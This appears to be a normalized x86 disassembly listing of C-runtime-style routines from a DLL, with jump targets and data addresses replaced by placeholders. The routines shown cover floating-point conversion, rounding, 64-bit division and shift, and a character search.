lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_1002a3a6
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_10037a80
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_10037aad
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10027728
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10038a03
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10037f7b
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
sub_10037b55
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10027728
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10038a03
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100384bf
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
sub_10037bfd
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_10024630
inc eax
push eax
push edi
push esi
call sub_1002b740
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_10037cbc
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_10037d79
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10037cbc
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1003a111
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1002b660
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
sub_10037e10
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10037ef0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_10037f0f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_1003ab63
call sub_1003ab63
mov [ esi ] eax
jmp r-xdata
call sub_1002972b
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1002480c
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_1003ab63
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_10037f7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_100384bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
